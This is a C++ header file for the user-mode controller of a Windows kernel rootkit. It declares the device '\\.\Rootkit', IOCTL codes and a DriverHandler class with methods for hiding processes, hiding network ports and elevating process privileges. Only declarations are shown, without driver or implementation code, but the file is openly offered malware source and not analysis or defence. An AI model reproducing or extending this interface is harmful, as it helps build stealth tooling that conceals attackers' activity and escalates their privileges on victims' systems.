#pragma once
#include "common.h"
namespace Driver{

constexpr int RootkitDeviceType = 0x8000;
constexpr int TestConnectionMaxLength = 1024;
constexpr auto DeviceName = L"\\\\.\\Rootkit";

enum class RookitIoctls {
	HideProcces       =    CTL_CODE(RootkitDeviceType, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS),
	TestConnection    =    CTL_CODE(RootkitDeviceType, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS),
	Elevate			  =	   CTL_CODE(RootkitDeviceType, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS),
	HidePort          =    CTL_CODE(RootkitDeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
};

class DriverHandler {
public:
	DriverHandler();
	~DriverHandler();
	bool check_connection(char* message);
	bool hide_process(char* message);
	bool elevate_process(char* message);
	bool hide_port(char* message);
	HANDLE hDevice;
};
}